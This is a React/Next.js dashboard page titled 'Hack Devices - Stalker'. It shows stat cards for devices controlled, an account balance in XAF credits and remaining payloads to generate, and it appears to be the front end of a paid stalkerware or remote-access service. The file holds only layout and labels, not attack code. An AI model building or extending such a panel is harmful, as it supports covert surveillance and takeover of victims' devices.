import { Smartphone, Wallet, Zap } from "lucide-react";
import Devices from "@/components/devices/Devices"
import { AllDevices } from "@/store/device-store";

export const metadata = {
  title: "Hack Devices - Stalker",
  description: ""
}

function LandingPage() {
  return (
    <div className="w-full h-full p-2 space-y-6">

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">

        <div className="rounded-2xl border bg-white dark:bg-neutral-900 dark:border-neutral-800 p-5 shadow-sm flex flex-col justify-between">

          <div className="flex items-center justify-between">
            <p className="text-sm text-gray-500 dark:text-gray-400">
              Devices Controlled
            </p>
            <Smartphone className="w-5 h-5 text-gray-400" />
          </div>

          <div className="flex items-end justify-between mt-3">
            <h2 className="text-3xl font-semibold text-gray-900 dark:text-white">
              {AllDevices.length}
            </h2>
            <span className="text-xs text-green-500">+12%</span>
          </div>

          <p className="text-xs text-gray-400 mt-2">
            Total devices you currently control
          </p>
        </div>

        <div className="rounded-2xl border bg-white dark:bg-neutral-900 dark:border-neutral-800 p-5 shadow-sm flex flex-col justify-between">

          <div className="flex items-center justify-between">
            <p className="text-sm text-gray-500 dark:text-gray-400">
              Balance
            </p>
            <Wallet className="w-5 h-5 text-gray-400" />
          </div>

          <div className="flex items-end justify-between mt-3">
            <h2 className="text-3xl font-semibold text-gray-900 dark:text-white">
              56K XAF
            </h2>
          </div>

          <p className="text-xs text-gray-400 mt-2">
            Available credits in your account
          </p>
        </div>

        <div className="rounded-2xl border bg-white dark:bg-neutral-900 dark:border-neutral-800 p-5 shadow-sm flex flex-col justify-between">

          <div className="flex items-center justify-between">
            <p className="text-sm text-gray-500 dark:text-gray-400">
              Payloads Remaining
            </p>
            <Zap className="w-5 h-5 text-gray-400" />
          </div>

          <div className="flex items-end justify-between mt-3">
            <h2 className="text-3xl font-semibold text-gray-900 dark:text-white">
              34
            </h2>
            <span className="text-xs text-red-500">Low</span>
          </div>

          <p className="text-xs text-gray-400 mt-2">
            Number of payloads you can still generate
          </p>
        </div>

      </div>
      <Devices />
    </div>
  )
}

export default LandingPage